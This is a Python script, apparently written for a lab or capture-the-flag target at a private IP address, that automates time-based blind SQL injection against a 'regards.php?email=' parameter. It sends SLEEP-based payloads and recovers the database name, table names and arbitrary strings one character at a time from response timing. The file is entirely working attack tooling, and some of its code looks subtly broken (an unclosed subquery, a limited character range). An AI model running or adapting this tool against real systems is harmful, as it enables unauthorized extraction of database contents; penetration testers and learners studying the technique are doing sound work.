#!/usr/bin/env python3

import requests
from urllib.parse import quote_plus
from time import time
from itertools import chain
from argparse import ArgumentParser


class Blind():
	def __init__(self, url='http://10.102.10.42/regards.php?email=',
				 delay=0.1):
		self.url = url
		self.delay = delay

	def send(self, payload, method='GET'):
		payload = quote_plus(payload)
		start = time()
		if method == 'GET':
			r = requests.get(self.url + payload)
		elif method == 'POST':
			r = requests.post(self.url, data=payload)

		end = time()
		if end - start >= self.delay:
			return True
		else:
			return False

	def make_payload(self, cond):
		query = "' OR IF(" + cond + ",SLEEP(" + str(self.delay) + \
				"),0) AND 'a'='a"
		return query

	def get_length(self, item):
		condition = 'LENGTH(' + item + ')={}'
		r = False
		i = 0

		while not r:
			i += 1
			payload = self.make_payload(condition.format(i))
			r = self.send(payload)

		return i

	def get_string(self, item, length=None):
		if not length:
			length = self.get_length(item)

		condition = "SUBSTRING(" + item + ",{},1)='{}'"
		string = ''

		for i in range(1, length + 1):
			r = False
			for j in range(92, 123):
				payload = self.make_payload(condition.format(i, chr(j)))
				r = self.send(payload)
				if r:
					break

			string += chr(j)

		return string

	def test(self, cond):
		if cond:
			return self.send(self.make_payload(cond))

	def get_db(self):
		return self.get_string('DATABASE()')

	def get_table(self, db):
		if not db:
			db = self.get_db()
		cond = "(SELECT table_name FROM information_schema.tables "
		cond += "WHERE table_schema='{}'".format(db)
		return self.get_string(cond)


def get_args():
	parser = ArgumentParser()
	parser.add_argument('-t', '--test', help='Condition to test')
	parser.add_argument('-l', '--length', help='Get length of element')
	parser.add_argument('-s', '--string', help='Get the string')
	parser.add_argument('-d', '--delay', help='Delay for time-based blind')

	return parser.parse_args()


if __name__ == '__main__':
	args = get_args()
	b = Blind()

	# print(b.get_string('DATABASE()'))
	if args.test:
		print(b.test(args.test))
	if args.length:
		print(b.get_length(args.length))
	if args.string:
		print(b.get_string(args.string))
